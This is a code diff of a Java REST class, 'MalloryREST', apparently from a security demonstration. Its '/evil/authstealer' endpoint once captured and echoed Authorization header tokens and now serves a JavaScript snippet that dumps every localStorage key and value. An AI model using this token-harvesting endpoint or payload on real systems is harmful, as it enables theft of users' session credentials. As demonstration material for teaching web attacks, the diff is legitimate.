@@ -1,26 +1,21 @@
 package de.msg.rest;
 
-import java.util.List;
-
 import javax.ws.rs.GET;
 import javax.ws.rs.Path;
-import javax.ws.rs.core.Context;
-import javax.ws.rs.core.HttpHeaders;
-import javax.ws.rs.core.Response;
+import javax.ws.rs.Produces;
+import javax.ws.rs.core.MediaType;
 
 @Path("/evil")
 public class MalloryREST {
 
 	@GET
-	@Path("authstealer")
-	public Response getAllEmployees(@Context HttpHeaders headers) {
+	@Path("/authstealer")
+	@Produces(value = MediaType.TEXT_HTML)
+	public String test() {
 		System.out.println("Dr. Evil is here");
-		String token = "";
-		List<String> authHeaders = headers.getRequestHeader(HttpHeaders.AUTHORIZATION);
-		if (authHeaders != null && !authHeaders.isEmpty()) {
-			token = authHeaders.get(0);
-			System.out.println(token);
-		}
-		return Response.status(200).entity(token).build();
+		return "for (var key in localStorage) {\n" + 
+				"  console.log(key + ':' + localStorage[key]);\n" + 
+				"}"
+				;
 	}
 }
